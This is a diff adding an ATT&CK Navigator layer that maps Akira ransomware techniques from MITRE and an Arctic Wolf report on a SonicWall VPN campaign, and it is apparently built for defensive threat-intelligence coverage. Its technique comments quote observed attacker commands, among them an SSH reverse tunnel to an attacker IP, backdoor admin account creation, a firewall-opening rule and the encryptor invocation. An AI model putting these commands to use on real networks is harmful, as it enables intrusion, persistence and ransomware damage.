@@ -1,0 +1,495 @@
+{
+  "name": "Akira (G1024) — MITRE Base + Arctic Wolf CTI Merged",
+  "versions": {
+    "attack": "18",
+    "navigator": "5.2.0",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "Aggregated ATT&CK Navigator layer for Akira ransomware (G1024). BLUE = MITRE ATT&CK base layer (G1024 v2.0, ATT&CK v18). ORANGE = new techniques observed in the Arctic Wolf Labs 'Smash and Grab' campaign analysis (Sep 2025, targeting SonicWall SSL VPNs via CVE-2024-40766). PURPLE = overlap where Arctic Wolf field observations validate existing MITRE G1024 mappings. The orange techniques represent net-new tradecraft not yet cataloged in the official MITRE G1024 profile, providing CTI-driven coverage expansion.",
+  "filters": {
+    "platforms": [
+      "Linux",
+      "macOS",
+      "Windows",
+      "Network",
+      "PRE",
+      "Containers",
+      "IaaS",
+      "SaaS",
+      "Office Suite",
+      "Identity Provider"
+    ]
+  },
+  "sorting": 3,
+  "layout": {
+    "layout": "side",
+    "aggregateFunction": "max",
+    "showID": true,
+    "showName": true,
+    "showAggregateScores": true,
+    "countUnscored": false,
+    "expandedSubtechniques": "annotated"
+  },
+  "hideDisabled": false,
+  "gradient": {
+    "colors": [
+      "#60a5fa",
+      "#c084fc",
+      "#fb923c"
+    ],
+    "minValue": 1,
+    "maxValue": 5
+  },
+  "legendItems": [
+    {
+      "label": "MITRE ATT&CK G1024 Base Only (established TTPs)",
+      "color": "#60a5fa"
+    },
+    {
+      "label": "Arctic Wolf CTI Only (net-new observations)",
+      "color": "#fb923c"
+    },
+    {
+      "label": "OVERLAP — Both Sources (field-validated TTPs)",
+      "color": "#c084fc"
+    }
+  ],
+  "showTacticRowBackground": true,
+  "tacticRowBackground": "#1a1f35",
+  "selectTechniquesAcrossTactics": true,
+  "selectSubtechniquesWithParent": false,
+  "selectVisibleTechniques": false,
+  "metadata": [
+    {
+      "name": "base_source",
+      "value": "MITRE ATT&CK — Akira G1024 v2.0 (Enterprise, ATT&CK v18)"
+    },
+    {
+      "name": "cti_source",
+      "value": "Arctic Wolf Labs — Smash and Grab: Akira Campaign Targeting SonicWall VPNs (Sep 2025)"
+    },
+    {
+      "name": "cti_url",
+      "value": "https://arcticwolf.com/resources/blog/smash-and-grab-aggressive-akira-campaign-targets-sonicwall-vpns/"
+    },
+    {
+      "name": "threat_actor",
+      "value": "Akira Ransomware / GOLD SAHARA (G1024)"
+    },
+    {
+      "name": "primary_cve",
+      "value": "CVE-2024-40766 (SonicWall SonicOS Improper Access Control)"
+    },
+    {
+      "name": "merge_date",
+      "value": "March 2026"
+    },
+    {
+      "name": "classification",
+      "value": "CONFIDENTIAL"
+    }
+  ],
+  "techniques": [
+    {
+      "techniqueID": "T1003",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nThreat actors targeted VM storage and DC filesystems for domain credentials. Veeam credential extraction included DPAPI secret decryption. AD data exfiltrated via wbadmin.exe.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1018",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.(Citation: Arctic Wolf Akira 2023)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nAD computer enumeration: 'Get-ADComputer -Filter * -Property *' selecting Name, DNSHostName, IPv4Address, OperatingSystem. Also Advanced IP Scanner, SoftPerfect Network Scanner.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1021",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1021.001",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) has used RDP for lateral movement.(Citation: Cisco Akira Ransomware OCT 2024)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nRDP was primary lateral movement tool. Event ID 4624 (logon type 10) observed post-discovery phase.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1021.002",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nSMBv2 session setup requests with Impacket signature. Hostnames: kali, WIN, DESKTOP-HPLM2TD, WINUTIL, etc. Failed (4625) and successful (4624) SMB logon type 3 events.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1021.004",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nSSH reverse tunnels: 'ssh -R 5555 root@170.130.165[.]42'. OpenSSH on 0.0.0.0. Cloudflared under C:\\ProgramData\\ssh for SSH access via Cloudflare Tunnel from domain controllers.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1027",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1027.001",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) has used binary padding to obfuscate payloads.(Citation: Cisco Akira Ransomware OCT 2024)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1033",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nquser command via WMIExec to identify logged-in users: 'cmd.exe /Q /c quser 1> \\\\Windows\\\\Temp\\\\RANDOM 2>&1'. Six-character randomized filename is WMIExec signature.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1036",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1036.005",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) has used legitimate names and locations for files to evade defenses.(Citation: Cisco Akira Ransomware OCT 2024)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1046",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nInternal scanning < 5 min after VPN login. Ports: 135 (RPC), 137 (NetBIOS), 445 (SMB), 1433 (SQL). Tools: SoftPerfect Network Scanner, Advanced IP Scanner.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1047",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nImpacket WMIExec usage — quser commands redirected to six-character randomized filenames: 'cmd.exe /Q /c quser 1> \\\\Windows\\\\Temp\\\\RANDOM 2>&1'.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1048",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nData exfiltrated via FileZilla SFTP, rclone, and SSH to VPS endpoints. Multiple exfiltration methods across different Akira affiliates.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1059",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1059.001",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) has used PowerShell scripts for credential harvesting and privilege escalation.(Citation: Cisco Akira Ransomware OCT 2024)\n\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nPowerShell used extensively: Get-ADUser/Get-ADComputer for AD enumeration, Invoke-WebRequest/WebClient for tool downloads (AnyDesk, cloudflared), custom scripts for Veeam credential extraction (MSSQL + PostgreSQL), New-NetFirewallRule for firewall modification.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1059.003",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\ncmd.exe used for: net user/net localgroup (account creation), quser (WMIExec-style session discovery with randomized output filenames), sc create (service installation), SSH tunnel initiation.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1069.002",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nBloodHound for AD relationship/permission group enumeration. MemberOf attribute collected in Get-ADUser. ESX Admins group targeted. NetExec also used.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.001",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nWindows Event Logs cleared as part of defense evasion phase before ransomware deployment.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1074",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nData staged via WinRAR with consistent CLI syntax across multiple compromised hosts. Only source/target drive letters varied.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1078",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) uses valid account information to remotely access victim networks, such as VPN credentials.(Citation: Secureworks GOLD SAHARA)(Citation: Arctic Wolf Akira 2023)(Citation: Cisco Akira Ransomware OCT 2024)\n\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nCredentials harvested via CVE-2024-40766 used to authenticate against patched devices. Repeated malicious SSL VPN logins on OTP MFA-enabled accounts. Evidence points to valid credentials rather than OTP config modification.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1087.002",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nAD user enumeration: 'Get-ADUser -Filter * -Properties *' outputting Enabled, Name, SamAccountName, MemberOf, PasswordLastSet, LastLogonDate. Also: nltest, dsquery, BloodHound, ldapdomaindump.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1098",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nNewly created accounts elevated to local Administrators and domain ESX Admins groups. Used for lateral movement, exfiltration, and RMM tool installation.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1105",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nIngress tool transfer: AnyDesk via WebClient.DownloadFile, cloudflared via Invoke-WebRequest, SoftPerfect/Advanced IP Scanner to %Temp%, RustDesk via batch script. Also Start-BitsTransfer.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1110",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nSonicWall confirmed SonicOS < 7.3 susceptible to brute force against MFA credentials. Evenly spaced periodic logins across multiple accounts suggest automated authentication scripting.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1111",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nMFA bypass — threat actors authenticated against OTP MFA-enabled accounts. SonicWall confirmed OTP seeds could generate valid tokens. Google TIG uncovered related OTP seed theft on SonicWall SMA.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1133",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) uses compromised VPN accounts for initial access to victim networks.(Citation: Secureworks GOLD SAHARA)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nInitial access via SonicWall SSL VPN logins from VPS hosting providers. Both local firewall accounts and LDAP-synchronized AD accounts targeted, including LDAP sync service accounts not intended for VPN access.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1135",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nSharpShares for network share enumeration: 'SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$ /threads:1000 /outfile:C:\\programdata\\tb.txt'.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1136.001",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nLocal admin accounts created on Veeam backup servers and VM admin servers. Blending account names: 'sqlbackup', 'veean'. Commands: 'net user sqlbackup /add' + 'net localgroup administrators sqlbackup /add'.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1136.002",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nDomain accounts created and elevated to 'ESX Admins' group for data exfil and RMM tool installation. Command: 'net group \"ESX Admins\" USERNAME /domain /add'.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1190",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nCVE-2024-40766 (improper access control) in SonicOS 5/6/7 on NSa and TZ series. Exploitation enabled abuse of admin functions such as configuration backup, creating credential theft opportunities.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1213",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1213.002",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.(Citation: Secureworks GOLD SAHARA)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1219",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.(Citation: Secureworks GOLD SAHARA)(Citation: Arctic Wolf Akira 2023)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nMultiple RMM tools: AnyDesk downloaded via PowerShell to C:\\ProgramData\\AnyDesk.exe, TeamViewer installed, RustDesk installed via batch script and registered as Windows service with auto-start.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1482",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) uses the built-in [Nltest](https://attack.mitre.org/software/S0359) utility or tools such as [AdFind](https://attack.mitre.org/software/S0552) to enumerate Active Directory trusts in victim environments.(Citation: Arctic Wolf Akira 2023) \n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nldapdomaindump for LDAP enumeration and domain trust discovery. nltest for domain controller enumeration and trust relationships.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1486",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) encrypts files in victim environments as part of ransomware operations.(Citation: BushidoToken Akira 2023)(Citation: CISA Akira Ransomware APR 2024)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nAkira ransomware deployed: 'akira.exe -n=1 -p=D:\\' and share lists '-s=share.txt'. Both Akira and Akira_v2 (Megazord/Rust-based) encryptors. Full kill chain: 55 min to 4 hours.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1490",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nVolume Shadow Copies deleted via vssadmin.exe before ransomware deployment. Standard Akira pre-encryption recovery inhibition.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1531",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) deletes administrator accounts in victim networks prior to encryption.(Citation: Secureworks GOLD SAHARA)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1543.003",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nRustDesk registered as persistent service: 'sc create RustDesk binpath=... start= auto'. Cloudflared installed as service: 'cloudflared.exe service install TOKEN'.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1555",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nCustom PowerShell script extracted encrypted creds from Veeam Backup & Replication (v11/v12), supporting MSSQL and PostgreSQL. Decrypted DPAPI secrets and Base64-encoded formats. Also: sqlcmd queried VeeamBackup.dbo.Credentials directly.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1558",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) have used scripts to dump Kerberos authentication credentials.(Citation: Cisco Akira Ransomware OCT 2024)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1560",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1560.001",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) uses utilities such as WinRAR to archive data prior to exfiltration.(Citation: Secureworks GOLD SAHARA)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nWinRAR with -v3g (3GB split archives). Files filtered by recency and business relevance: general folders = 6 months, HR/AP folders = up to 30 months of data.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1562",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1562.001",
+      "color": "#c084fc",
+      "comment": "[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]\n\n--- MITRE ATT&CK G1024 (Akira) ---\n[Akira](https://attack.mitre.org/groups/G1024) has disabled or modified security tools for defense evasion.(Citation: Cisco Akira Ransomware OCT 2024)\n\n--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---\nEDR tools and Microsoft Defender disabled prior to ransomware deployment. Systematic defense impairment as pre-encryption preparation.",
+      "score": 3,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1562.004",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nHost firewall modified: 'New-NetFirewallRule -Name sshd -DisplayName \"OpenSSH Server (sshd)\" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22'. OpenSSH configured on 0.0.0.0.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1567",
+      "color": "",
+      "comment": "",
+      "score": 0,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1567.002",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) will exfiltrate victim data using applications such as [Rclone](https://attack.mitre.org/software/S1040).(Citation: Secureworks GOLD SAHARA)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1572",
+      "color": "#fb923c",
+      "comment": "[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]\nSSH reverse tunnels and Cloudflare Tunnels to bypass NAT for C2. Cloudflared ran from AD DCs, installed as persistent service. Automated PowerShell installation scripts observed.",
+      "score": 5,
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1657",
+      "color": "#60a5fa",
+      "comment": "[MITRE ATT&CK G1024 — Akira Base]\n[Akira](https://attack.mitre.org/groups/G1024) engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.(Citation: BushidoToken Akira 2023)(Citation: CISA Akira Ransomware APR 2024)",
+      "score": 1,
+      "enabled": true,
+      "showSubtechniques": false
+    }
+  ]
+}
